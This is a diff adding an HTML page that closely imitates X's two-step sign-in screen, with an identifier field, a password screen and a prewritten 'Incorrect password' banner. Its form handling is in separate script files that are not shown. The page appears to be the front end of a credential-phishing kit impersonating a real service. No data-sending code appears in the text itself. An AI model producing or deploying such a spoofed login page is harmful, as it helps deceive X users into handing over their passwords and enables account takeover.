@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en" class="bg-black">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Sign in to X</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="styles.css" />
+  <script src="config.js" defer></script>
+</head>
+<body class="min-h-screen bg-black text-white flex items-center justify-center">
+
+  <!-- Error popup (full-width bottom banner) -->
+  <div id="errorPopup" class="hidden fixed bottom-0 inset-x-0 z-50">
+    <div class="bg-blue-600 text-white py-3 px-4 text-center font-bold">
+      Incorrect password
+    </div>
+  </div>
+
+  <!-- STEP 1: Identifier input -->
+  <main id="step1" class="w-full max-w-[420px] px-8 py-12 relative">
+
+    <button class="absolute top-5 left-5 text-white text-2xl font-normal hover:opacity-60 leading-none">
+      ×
+    </button>
+
+    <h1 class="text-[28px] font-black text-left mb-9 leading-tight">
+      Sign in to X
+    </h1>
+
+    <div class="space-y-6">
+      <input
+        id="identifier"
+        type="text"
+        placeholder="Phone, email address, or username"
+        class="w-full bg-transparent border border-gray-700 focus:border-[#1d9bf0] focus:ring-1 focus:ring-[#1d9bf0]/50 text-white placeholder-gray-500 rounded-full px-5 py-4 text-[17px] outline-none transition"
+      />
+
+      <button
+        onclick="validateAndProceed()"
+        class="w-full bg-white text-black font-bold text-[17px] py-3.5 rounded-full hover:bg-gray-200 active:bg-gray-300 transition shadow-[0_1px_3px_rgba(0,0,0,0.4)]"
+      >
+        Next
+      </button>
+
+      <button class="w-full border border-gray-500 text-white font-bold text-[17px] py-3.5 rounded-full hover:bg-white/5 active:bg-white/10 transition">
+        Forgot password?
+      </button>
+    </div>
+
+    <p class="text-left text-[15px] text-gray-400 mt-10">
+      Don’t have an account? 
+      <a href="#" class="text-[#1d9bf0] hover:underline">Sign up</a>
+    </p>
+  </main>
+
+  <!-- STEP 2: Password screen -->
+  <main id="step2" class="w-full max-w-[420px] px-8 py-12 relative hidden">
+
+    <button 
+      onclick="goBackToStep1()"
+      class="absolute top-5 left-5 text-white text-3xl font-bold hover:opacity-70 leading-none px-3 py-1"
+      style="transform: translateX(-2px);"
+    >
+      <
+    </button>
+
+    <h1 class="ml-12 text-[28px] font-black text-left mb-6 leading-tight">
+      Enter your password
+    </h1>
+
+    <div class="mb-6 bg-gray-900/70 border border-gray-700 rounded-2xl px-5 py-3.5 text-[17px] text-gray-300">
+      <div class="text-sm text-gray-500 mb-0.5">Identifier</div>
+      <div id="displayedIdentifier" class="font-medium text-white break-all"></div>
+    </div>
+
+    <div class="space-y-6">
+      <input
+        id="password"
+        type="password"
+        placeholder="Password"
+        class="w-full bg-transparent border border-gray-700 focus:border-[#1d9bf0] focus:ring-1 focus:ring-[#1d9bf0]/50 text-white placeholder-gray-500 rounded-full px-5 py-4 text-[17px] outline-none transition"
+      />
+
+      <a href="#" class="block text-[#1d9bf0] text-[15px] hover:underline">
+        Forgot password?
+      </a>
+
+      <button 
+        id="loginButton"
+        class="w-full bg-white text-black font-bold text-[17px] py-3.5 rounded-full hover:bg-gray-200 active:bg-gray-300 transition shadow-[0_1px_3px_rgba(0,0,0,0.4)]"
+      >
+        Log in
+      </button>
+    </div>
+
+    <p class="text-left text-[15px] text-gray-400 mt-10">
+      Don’t have an account? 
+      <a href="#" class="text-[#1d9bf0] hover:underline">Sign up</a>
+    </p>
+  </main>
+
+  <script src="script.js" defer></script>
+
+</body>
+</html>
